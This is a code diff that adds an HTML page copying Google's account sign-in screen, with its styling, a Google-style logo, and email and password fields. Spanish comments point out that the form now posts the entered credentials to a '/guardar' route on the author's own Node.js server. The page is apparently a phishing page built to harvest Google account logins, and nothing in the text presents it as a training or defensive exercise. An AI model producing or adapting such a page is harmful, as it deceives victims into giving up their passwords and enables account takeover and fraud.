@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sign in - Google Accounts</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { font-family: 'Roboto', sans-serif; background-color: #fff; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .container { width: 100%; max-width: 450px; padding: 40px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); border-radius: 8px; }
+        .logo { text-align: center; margin-bottom: 25px; }
+        .logo svg { width: 48px; height: 48px; }
+        h1 { color: #202124; font-size: 24px; font-weight: 400; margin: 0; text-align: center; }
+        p { color: #5f6368; font-size: 16px; text-align: center; margin-top: 8px; }
+        .form-group { margin-top: 25px; }
+        input[type="email"], input[type="password"] {
+            width: 100%; padding: 13px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box;
+        }
+        input[type="email"]:focus, input[type="password"]:focus { outline: none; border-color: #1a73e8; }
+        .forgot-email { text-align: right; margin-top: 10px; }
+        .forgot-email a { color: #1a73e8; text-decoration: none; font-size: 14px; }
+        .next-button {
+            width: 100%; padding: 10px; background-color: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 14px; font-weight: bold; margin-top: 20px; cursor: pointer;
+        }
+        .next-button:hover { background-color: #185abc; }
+        .create-account { text-align: center; margin-top: 30px; }
+        .create-account a { color: #1a73e8; text-decoration: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" class="l5Lhkf"><g clip-path="url(#A)"><path d="M22.41 12c0-1.61-.74-3.04-1.9-3.97L18.8 7.9c.48.78.77 1.67.77 2.64 0 2.58-2.12 4.68-4.73 4.68-2.61 0-4.73-2.1-4.73-4.68s2.12-4.68 4.73-4.68c.86 0 1.67.23 2.37.63l1.71-.13c-1.16-.93-2.59-1.56-4.16-1.56-3.87 0-7 3.11-7 6.94s3.13 6.94 7 6.94 7-3.11 7-6.94z" fill="#EA4335"/><path d="M14.84 12L12 8.88l1.72-1.48 2.84 3.12-2.84 3.12L12 15.12z" fill="#FBBC05"/><path d="M22.41 12c0 1.61-.74 3.04-1.9 3.97l-1.71.13c.48-.78.77-1.67.77-2.64 0-2.58-2.12-4.68-4.73-4.68-.86 0-1.67.23-2.37.63l-1.71-.13c1.16-.93 2.59-1.56 4.16-1.56 3.87 0 7 3.11 7 6.94z" fill="#34A853"/><path d="M14.84 12L12 15.12l1.72 1.48 2.84-3.12-2.84-3.12L12 8.88z" fill="#4285F4"/></g><defs><clipPath id="A"><path transform="matrix(1.14286 0 0 1.14286 -10 -2)" d="M0 0h24v24H0z"/></clipPath></defs></svg>
+        </div>
+        <h1>Sign in</h1>
+        <p>Use your Google Account</p>
+
+        <!-- EL CAMBIO CLAVE ESTÁ AQUÍ -->
+        <!-- El action ahora apunta a la ruta '/guardar' de nuestro servidor Node.js -->
+        <form action="/guardar" method="post">
+            <div class="form-group">
+                <input type="email" name="email" placeholder="Email or phone" required>
+            </div>
+            <div class="forgot-email">
+                <a href="#">Forgot email?</a>
+            </div>
+            <div class="form-group">
+                <input type="password" name="password" placeholder="Enter your password" required>
+            </div>
+            <button type="submit" class="next-button">Next</button>
+        </form>
+
+        <div class="create-account">
+            <a href="#">Create account</a>
+        </div>
+    </div>
+</body>
+</html>
